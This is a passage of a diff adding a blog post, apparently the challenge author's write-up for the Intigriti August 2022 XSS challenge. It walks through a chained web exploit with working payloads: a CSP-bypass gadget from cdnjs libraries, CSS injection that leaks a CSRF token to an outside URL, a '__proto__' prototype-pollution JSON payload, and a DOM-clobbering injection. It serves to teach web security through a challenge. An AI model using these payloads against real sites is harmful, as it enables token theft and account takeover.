+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'array'</span><span class="token punctuation">,</span> <span class="token string">'Array.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">'String.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token string">'Number.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'Object.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'function'</span><span class="token punctuation">,</span> <span class="token string">'Function.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+
+      <span class="token keyword">return</span> result
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> prototypeName<span class="token punctuation">,</span> prototype</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> oldFuncs <span class="token operator">=</span> protos<span class="token punctuation">[</span>name<span class="token punctuation">]</span>
+      <span class="token keyword">const</span> newFuncs <span class="token operator">=</span> newProtos<span class="token punctuation">[</span>name<span class="token punctuation">]</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> fnName <span class="token keyword">of</span> newFuncs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldFuncs<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fnName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token keyword">const</span> fullName <span class="token operator">=</span> prototypeName <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fnName
+          result<span class="token punctuation">.</span>prototypeFunctions<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fullName<span class="token punctuation">)</span>
+          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>prototype<span class="token punctuation">[</span>fnName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+              result<span class="token punctuation">.</span>functionsReturnWindow<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fullName<span class="token punctuation">)</span>
+            <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+          <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The result is:</p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p3.png"></p>
+<p>So, we can replace <code>prototype.js</code> with <code>MooTools</code>: </p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
+  &#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>What if the players never heard about <code>SmoothGate</code>? They can use the similar approach in an automatic way.</p>
+<p><code>cdn.js</code> provides an <a target="_blank" rel="noopener" href="https://cdnjs.com/api#browse">API</a> to query all hosted libraries, the player can leverage this API and the script above to build a simple tool to find all gadgets on <code>cdn.js</code>. </p>
+<p>I will open source a project about this within a few days.</p>
+<p>Now we have an XSS, but it still need user interaction to submit the form.</p>
+<p>In order to avoid user interaction, we need CSRF. To perform CSRF, we need to steal CSRF token.</p>
+<h3><span id="steal-csrf-token">Steal CSRF token</span></h3><p>Where is the CSRF token?</p>
+<p>The CSRF token is in the <code>app.php</code> page, it appears twice:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= $csrf_token ?><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= $csrf_token ?><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>There is another vulnerability in <code>app.php</code>:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nameField<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>$_SESSION[&#39;name&#39;]</code> is not encoded before printing, so we have a HTML injection here. But the problem is, there is another check for the length of the name:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name too long'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Given that the CSP is strict and the length is very limited, XSS is most likely impossible. It’s fine, because XSS is not the only way to steal something,  we can use CSS injection!</p>
+<p>This is a good article to learn what CSS injection is and various way to exploit: <a target="_blank" rel="noopener" href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives/">CSS Injection Primitives</a>.</p>
+<p>Usually, the blog post about stealing CSRF token is for <code>&lt;input&gt;</code>, but we have <code>&lt;input type=hidden&gt;</code> here, so it won’t work. if there is other sibling element, we can use sibling selector like this: <code>input[value^=a] div</code> to steal the token, but it’s also not working here because <code>&lt;input&gt;</code> is wrapped by a <code>&lt;div&gt;</code>.</p>
+<p>Then, how to leak the content? Since <code>&lt;input&gt;</code> won’t work, we can use <code>&lt;meta&gt;</code> tag!</p>
+<p><code>&lt;meta&gt;</code> is not displayed because browser adds a default <code>display:none</code> attribute, we can override it by explicitly declare <code>meta &#123; display:block; &#125;</code>. It’s not enough, because <code>&lt;meta&gt;</code> is under <code>&lt;head&gt;</code>, and <code>&lt;head&gt;</code> is also hidden by default, so we need <code>head, meta &#123; display:block; &#125;</code> to make it visible.</p>
+<p>You may wondering: “It should be useless to make it ‘visible’, because meta content is invisible by default, you can’t see the content on the screen!”</p>
+<p>It sounds fair, but surprisingly, the style for <code>&lt;meta&gt;</code> still apply even you can’t see the content. </p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p4.png"></p>
+<p>By the way, there is a selector called <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">:has</a>, this will make this challenge much easier. But it’s enabled by default from Chrome 105 which is still in beta until the end of August(yep, two days after). </p>
+<p>If we can inject <code>&lt;style&gt;</code> tag, we can steal the first character of the CSRF token in the following way:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+  <span class="token selector">head, meta[name=csrf-token]</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  
+  <span class="token selector">meta[name=csrf-token][content^="a"]</span> <span class="token punctuation">&#123;</span> 
+    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?char=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  
+  <span class="token selector">meta[name=csrf-token][content^="b"]</span> <span class="token punctuation">&#123;</span> 
+    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?char=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can steal all 32 characters by doing the same thing again and again. The implementation is a bit trivial, you can build your own or try to utilize some open-source projects on GitHub.</p>
+<p>When displaying a message, it calls <code>DOMPurify.sanitize</code> to filter out malicious content, but <code>&lt;style&gt;</code> is not consider harmful and it’s allowed by default in DOMPurify.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> getTimeout <span class="token operator">=</span> options<span class="token punctuation">.</span>timeout <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">1000</span><span class="token punctuation">)</span>
+  <span class="token keyword">const</span> container <span class="token operator">=</span> options<span class="token punctuation">.</span>container <span class="token operator">||</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span>
+
+  <span class="token keyword">const</span> modal <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span>
+  modal<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">'messageModal'</span>
+  modal<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
+  container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>modal<span class="token punctuation">)</span>
+  history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span>
+
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    container<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>modal<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token function">getTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The problem is, our injected element will be removed after so called <code>timeout</code>, the default timeout is <code>Math.random()*300 + 300</code> as per following code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'#msg='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>message<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span>
+  <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">testing</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    options<span class="token punctuation">[</span><span class="token string">'production'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    options<span class="token punctuation">[</span><span class="token string">'production'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
+    options<span class="token punctuation">[</span><span class="token string">'timeout'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span> <span class="token operator">+</span> <span class="token number">300</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">showMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">container</span><span class="token operator">:</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token operator">...</span>options
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can’t steal a 32-characters CSRF token in 600ms, unless we find a way to increase the timeout.</p>
+<p>Look at the following part carefully:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">testing</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  options<span class="token punctuation">[</span><span class="token string">'production'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+  options<span class="token punctuation">[</span><span class="token string">'production'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
+  options<span class="token punctuation">[</span><span class="token string">'timeout'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span> <span class="token operator">+</span> <span class="token number">300</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If the condition(<code>document.domain.match(/testing/)</code>) is <code>false</code>, the <code>timeout</code> will be set and can’t be change. If we can let the condition be <code>true</code> and find a prototype pollution, we can pollute <code>Object.prototype.timeout</code> to manipulate the timeout.</p>
+<h3><span id="prototype-pollution">Prototype pollution</span></h3><p>Regarding prototype pollution, people usually think it only appear when parsing query string or merge the object. In fact, the problem is about the pattern <code>obj[x][y]</code>, anywhere with such pattern can be vulnerable if you can control both <code>x</code> and <code>y</code></p>
+<p>It’s exactly the case for <code>initTheme</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">initTheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>matchMedia <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span><span class="token function">matchMedia</span><span class="token punctuation">(</span><span class="token string">'(prefers-color-scheme: dark)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    isDarkMode <span class="token operator">=</span> <span class="token boolean">true</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"theme.php"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">serverTheme</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      theme <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">primary</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">secondary</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token comment">// look carefully at the following for loop</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> themeName <span class="token keyword">in</span> serverTheme<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> currentTheme <span class="token operator">=</span> theme<span class="token punctuation">[</span>themeName<span class="token punctuation">]</span>
+        <span class="token keyword">const</span> currentServerTheme <span class="token operator">=</span> serverTheme<span class="token punctuation">[</span>themeName<span class="token punctuation">]</span>
+
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">in</span> currentServerTheme<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          currentTheme<span class="token punctuation">[</span>item<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> isDarkMode <span class="token operator">?</span> currentServerTheme<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">.</span>dark <span class="token operator">:</span> currentServerTheme<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">.</span>light
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token keyword">const</span> themeDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.theme-text'</span><span class="token punctuation">)</span>
+      themeDiv<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Primary - Text: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>theme<span class="token operator">?.</span>primary<span class="token operator">?.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, Background: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>theme<span class="token operator">?.</span>primary<span class="token operator">?.</span><span class="token function">bg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+        Secondary - Text: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>theme<span class="token operator">?.</span>secondary<span class="token operator">?.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, Background: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>theme<span class="token operator">?.</span>secondary<span class="token operator">?.</span><span class="token function">bg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+      </span><span class="token template-punctuation string">`</span></span>
+      <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In the loop, it assign <code>theme[themeName]</code> to <code>currentTheme</code>.</p>
+<p>Then in another inner loop, a function is assigned to <code>currentTheme[item]</code>, which is actually <code>theme[themeName][item]</code>.</p>
+<p>We can pollute the prototype by providing a theme like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
+  <span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+    <span class="token string-property property">"timeout"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"dark"</span><span class="token operator">:</span><span class="token string">"99999"</span><span class="token punctuation">,</span><span class="token string-property property">"light"</span><span class="token operator">:</span><span class="token string">"99999"</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>After theme is loaded, <code>Object.prototype.timeout</code> became a function which always returns <code>&quot;99999&quot;</code>.</p>
+<p>We have made good progress by controlling the <code>timeout</code>, but how about the condition?</p>
+<p>How can we make <code>document.domain.match(/testing/)</code> true? Is that even possible?</p>
+<h3><span id="dom-clobbering-to-the-rescue">DOM clobbering to the rescue</span></h3><p>The value of <code>document.domain</code> is what you thought, until DOM clobbering comes into play.</p>
+<p>Besides clobbering <code>window</code> properties, <code>document</code> properties can also be clobbered via <code>&lt;img&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;object&gt;</code> and <code>&lt;embed&gt;</code></p>
+<p>For example, if we have <code>&lt;img name=cookie&gt;</code>, the value of <code>document.cookie</code> will be the img element instead of a string.</p>
+<p>Remember that we have a HTML injection in 20 characters?</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nameField<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>We can let <code>name</code> be <code>&quot;&gt;&lt;img name=cookie&gt;</code>, it’s 19 characters, just fits.</p>
+<p>After <code>document.domain</code> became a DOM element, <code>document.domain.match</code> will throw an error because there is no <code>match</code> method in DOM or in it’s prototype chain.</p>
+<p>Wait, did I say prototype chain?</p>
+<p>In JavaScript, when a given method is not found, the JS engine will keep looking one level up to check it’s prototype until the prototype is <code>null</code>, hence the name “prototype chain”.</p>
+<p>DOM element is also a kind of <code>object</code>, if <code>Object.prototype.match</code> is there, it will be used.</p>
+<p>Luckily, we can make it happen by leveraging the prototype pollution vulnerability:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
+  <span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+    <span class="token string-property property">"timeout"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"dark"</span><span class="token operator">:</span><span class="token string">"99999"</span><span class="token punctuation">,</span><span class="token string-property property">"light"</span><span class="token operator">:</span><span class="token string">"99999"</span>
